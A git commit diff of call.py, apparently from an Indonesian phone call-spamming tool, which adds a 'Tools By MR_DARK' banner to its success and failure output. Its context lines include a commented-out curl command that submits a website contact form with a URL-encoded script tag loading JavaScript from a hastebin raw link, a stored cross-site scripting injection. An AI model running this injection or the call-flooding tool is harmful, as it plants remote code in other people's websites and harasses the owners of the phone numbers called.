f325271bcb33c6ef5ef4397ef8506a37f6038fa5
DARK-02 <76576010+DARK-02@users.noreply.github.com>
2022-04-13 07:41:14 +0700

    Update call.py

--- call.py
+++ call.py
@@ -7,9 +7,11 @@ darkstatus = darkstat.split(',')[0];
 bjer = dark.split('"message":"')[1];
 mes = bjer.split('"')[0];
 if darkstatus == "1":
+     print ("[»] *Tools By MR_DARK*")
      print (f"*✔* *Calling* *+62{sesid}* *Success* :)")
      print (f"*Message:* {mes}")
 else:
+     print ("[»] *Tools By MR_DARK*")
      print (f"*✘* *Calling* *+62{sesid}* *gagal* :(")
      print (f"*Message:* {mes}")
      #os.system(f"curl --url {tar} --data 'nama=admin&email=admin%40gmail.com&pesan=%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22https%3A%2F%2Fhastebin.com%2Fraw%2Fudoxideleh%22%3E%3C%2Fscript%3E&submit=Kirim+Pesan'")
